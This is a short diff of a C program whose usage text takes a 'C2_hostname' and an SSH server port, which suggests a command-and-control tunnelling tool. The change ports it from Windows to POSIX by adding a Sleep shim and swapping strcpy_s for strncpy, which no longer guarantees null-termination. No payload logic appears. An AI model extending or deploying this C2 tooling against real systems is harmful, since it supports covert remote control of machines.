@@ -32,6 +32,12 @@ Restart sshd:
 systemctl restart ssh
 */
 
+#ifndef _WIN32
+#include <unistd.h>
+void Sleep(int milliseconds) {
+    sleep(milliseconds/1000);
+}
+#endif
 
 void help(char* self) {
     printf("Usage: %s [user@]C2_hostname [LOCAL_SSH_SERVER_PORT]\n", self);
@@ -57,11 +63,11 @@ void parse_args(int argc, char** argv,
     if (*C2_host != NULL){
         *C2_host[0] = '\0';
         (*C2_host)++;
-        strcpy_s(username, 100, argv[1]);
+        strncpy(username, argv[1], 100);
     }
     else {
         *C2_host = argv[1];
-        strcpy_s(username, 100, "anonymous"); // default user
+        strncpy(username, "anonymous", 100); // default user
     }
 
     if (argc == 3) {
